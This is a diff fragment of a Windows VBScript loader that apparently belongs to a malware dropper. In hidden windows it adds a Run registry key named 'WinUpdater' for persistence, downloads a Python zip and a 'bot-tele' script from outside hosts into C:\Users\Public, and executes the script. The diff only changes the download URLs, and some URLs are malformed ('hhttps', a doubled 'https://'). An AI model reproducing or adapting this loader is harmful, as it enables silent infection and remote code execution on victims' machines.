@@ -11,13 +11,13 @@ objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -U
 objShell.Run "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v WinUpdater /t REG_SZ /d ""C:\Downloads\bypass.vbs""", 0, True
 
 
-objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://https://meowdelight2024.id.vn//python-3.10.11-embed-win32.zip -OutFile C:\Users\Public\Document.zip""", 0, True
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://meowdelight2024.id.vn//Python310__1___1.zip -OutFile C:\Users\Public\Document.zip""", 0, True
 
 
 objShell.Run "powershell.exe -WindowStyle hidden -Command ""Expand-Archive C:\Users\Public\Document.zip -DestinationPath C:\Users\Public\Document""", 0, True
 
 
-objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://github.com/thanhpc777/vip777/raw/main/bot-tele -OutFile C:\Users\Public\Document\script.py""", 0, True
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI hhttps://github.com/thanhpc777/vip777/123s/raw/main/bot-tele -OutFile C:\Users\Public\Document\script.py""", 0, True
 
 
 objShell.Run "powershell.exe -WindowStyle hidden -Command ""C:\Users\Public\Document\python C:\Users\Public\Document\script.py""", 0, True
